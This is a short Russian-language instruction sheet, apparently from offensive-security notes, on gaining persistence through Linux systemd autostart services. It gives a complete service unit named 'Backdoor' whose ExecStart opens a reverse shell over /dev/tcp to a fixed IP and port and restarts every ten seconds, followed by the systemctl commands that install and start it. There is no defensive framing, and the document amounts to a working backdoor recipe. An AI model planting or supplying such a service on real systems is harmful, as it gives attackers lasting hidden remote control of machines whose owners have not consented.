## Службы автозапуска
- systemd (Linux):
	1. Описываем сервис с реверс шеллом:```
		[Unit] 
		Description=Backdoor 
		After=network.target ssh.service 
		
		[Service] 
		Type=simple 
		PIDFile=/var/run/backdoor.pid 
		ExecStart=sh -i >& /dev/tcp/192.168.0.177/9001 0>&1" 
		Restart=always 
		RestartSec=10 
		
		[Install] 
		WantedBy=multi-user.target```
	2. Располагаем его в файле: `/lib/systemd/system/backdoor.service`
	3. Запускаем командами: ```
		sudo systemctl enable backdoor.service
		sudo systemctl start backdoor.service```
